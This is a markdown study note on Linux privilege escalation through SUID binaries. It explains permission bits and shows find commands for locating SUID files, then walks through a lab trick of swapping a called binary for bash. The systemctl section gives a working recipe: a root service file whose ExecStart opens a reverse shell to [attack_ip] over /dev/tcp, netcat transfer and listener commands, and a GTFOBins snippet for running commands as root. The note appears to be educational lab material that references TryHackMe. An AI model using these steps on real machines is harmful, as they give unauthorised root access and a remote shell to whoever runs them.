# Linux Privilege Escalation: Exploiting SUID Binaries
> Find SUID, SGID, and Sticky Bits set. Enumerate what you have. Then research (Google) it. Dig around, find out what you can do with what you have.

## Resources: 
- [GTFOBins, SUID](https://gtfobins.github.io/#+suid)

## Contents
- [Intro](#intro)
  - [What are SUID Binaries?](#what-are-suid-binaries)
  - [Anatomy of Linux Permissions](#anatomy-of-linux-permissions)
  - [Exploiting SUID Binaries](#exploiting-suid-binaries)
- [Find SUID Files](#find-suid-files)
- [Techniques & Tools](#techniques--tools)
  - [Scenario](#scenario)
  - [Initial Info Gathering](#initial-info-gathering)
  - [The Hack](#the-hack)
- [SUID systemctl](#suid-systemctl)

## Intro

### What are SUID Binaries?
- In addition to the three main file access permissions (read, write, execute), Linux also provides users with specialized permissions that can be utilized in specific situations. One of these access permissions is the SUID (Set User ID) permission.
- When applied, this permission provides users with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.
- SUID perms are typically used to provide unprivileged users with the ability to run specific scripts or binaries with "root" perms.
  - It should be noted, however, that the provision of elevated privileges is limited to the execution of the script and does not translate to elevation of privileges.
  - However, If improperly configured, unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session. 

### Anatomy of Linux Permissions
&nbsp;&nbsp;&nbsp;![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/6dca53ac-3e7d-48a0-afef-ae8feb557ae6) ![suid](https://github.com/GregKedrovsky/Hacking/assets/26492233/b255227b-0ac8-405e-8d48-08c906f3edca)

- `SUID` - If SUID bit is set on a file and a user executed it, the process will have the same rights as the owner of the file being executed.
- `GUID` - Same as SUID but with group ownership: the process will have the same group rights of the file being executed.
- `Sticky Bit` - If the directory has the sticky bit set, a file can be deleted only by the file owner, the directory owner, or by a privileged user. The sticky bit prevents a user from deleting other users' files from public directories such as /tmp:

### Exploiting SUID Binaries
- This is the functionality that we will be attempting to exploit in order to elevate our privileges.
- However, the success of the attack will depend on the following factors:
  - Owner of the SUID Binary: Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the "root" user or other privileged users.
  - Access Permissions: We will require executable permissions in order to execute the SUID binary.

----
## Find SUID Files

```
find / -perm /4000  # find SUID files
find / -perm /2000  # find SGID files
find / -perm /6000  # find both SUID and SGID files

# Example Implementations:
find / -perm -u=s -type f 2>/dev/null
find / -perm -04000 -type f -ls 2>/dev/null
```

From the `find` [man page](), perm searches: 
- `-perm mode`
  - Finds files with the EXACT match of the perm specified
  - `-perm g=w` or `-perm 0020` would find files that ONLY have the group write permission on and no others. 
- `-perm -mode`
  - Finds files with ALL of the perms specified.
  - `-perm -664` would find files that have AT LEAST ALL those perms (e.g., 0777 would be found).
  - `-perm -220` would find files writable by BOTH owner and group.
- `-perm /mode`
  - Finds files with ANY of the perms specified.
  - `-perm /222` would find files writable by somebody (owner, group, AND/OR other).
  - `-perm /220` would find files writable by EITHER owner or group or BOTH.
```

----
## Techniques & Tools
> Although the following is VERY simplistic, it illustrates the concept and process.

### Scenario
- You have access to the target machine as "user1" (an unprivileged user).
  - Simple Enum: `whoami`, `groups user1`
- Within user1's home dir there are three files, one of which is `welcome`
  - This file is owned by root and is executable by user, group, and world; it also has the suid bit set.
  - So we have a file that when executed is executed with root privileges.
 
### Initial Info Gathering
- Use the file command to find out some information about the binary `welcome`
```
pwd
# /home/user1
file welcome
```
- There's nothing of note in that. Sometimes you can use unloaded binaries (like the so.2 file) and provide a malicious file for the program to load instead. But, here... not much. Moving on.
- Use the strings command to print any readable characters in the file.
```
strings welcome
```
- At the top you can see the binary loads a shared object (an .so file)
- A few lines down, you can see that "greetings" is listed. That is apparently the greeetings file in the same subdir.  Since it's an suid binary, `welcome` will execute `greetings` with root perms.

### The Hack
```
rm greetings
cp /bin/bash greetings   # copies bash shell to the current directory and names it greetings
```
- Now, when `welcome` is run and it calls `greetings`, you get a bash shell with root privileges.

## SUID systemctl
> If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.

### 1. Payload
- Prepare your payload file `root.service`:
```
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/[attack_ip]/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

### 2. Writeable Directory
- Find a writeable directory on the target machine
```
find / -type f -maxdepth 2 -writable
```
or
```
find / -type d -maxdepth 2 -writable
```

### 3. Transfer the Payload
- Transfer the payload from your attack machine to the target machine (or just write file there using vi or vim if you have access to it)

Start up a listener on the target machine, redirecting the output to your file name: 
```
nc -vl 44444 > root.service
```

Send the file from attack machine to target:
```
nc -n [target_ip] 44444 < root.service
```

### 4. Reverse Shell Listener
- Start your listener on port 9999 on your attack machine
```
nc -lvnp 9999
```

### 5. Execute Payload
- Execute the payload on the target machine (assume the file is under /tmp/)
```
/bin/systemctl enable /tmp/root.service
```

You should see output similar to the following: 
```
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service
Created symlink from /etc/systemd/system/root.service -> /dev/shm/root.service
```

Start it up on the target machine (and watch your listener on your attack machine): 
```
/bin/systemctl start root
```

### 6. Reverse Shell
- The nc listening on 9999 should give you root.

### [GTFOBins, systemctl](https://gtfobins.github.io/gtfobins/systemctl/) Explanation
- This does not work the same as the above.
- This allows you to run `/bin/sh` as root and store the output of the command (`c`) in the output file.
- Replace the following echo content with the content of the root.service file above and it should do the same thing.
- If the local systmctl does not work for you (if you get an error that says something like "Interactive authentication required"), then just use the one you found (probably /bin/systemclt). 
```
sudo install -m =xs $(which systemctl) .
# The which command finds the path to the systmctl accessible to us (the SUID)
# The $() is used for command substitution. It allows you to execute a command and substitute its output in place of the $() expression.
# The install command copies files and sets attributes
# Therefore: this command installs a local copy of systemctl and sets the mode (-m) to "xs" (execute, suid)

TF=$(mktemp).service                      # create a variable (mktemp = create temporary file or directory)
echo '[Service]                           # echo the following lines into that variable
Type=oneshot                              # ...basically creates a text file with this text in it
ExecStart=/bin/sh -c "id > /tmp/output"   # THIS IS THE COMMAND YOU ARE RUNNING WITH ROOT PRIVILEGES
[Install]                                 # ...change it according to your needs, wants, and desires
WantedBy=multi-user.target' > $TF         # output the previous text into our variable
./systemctl link $TF                      # link the file b/c it is not in the normal search path
./systemctl enable --now $TF              # enable the new service we configured and start it --now
```

### Resources:
- [GTFOBins, systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
- [Privilege Escalation](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740) by Alvin Smith
- [TryHackMe: Vulversity](https://tryhackme.com/r/room/vulnversity)
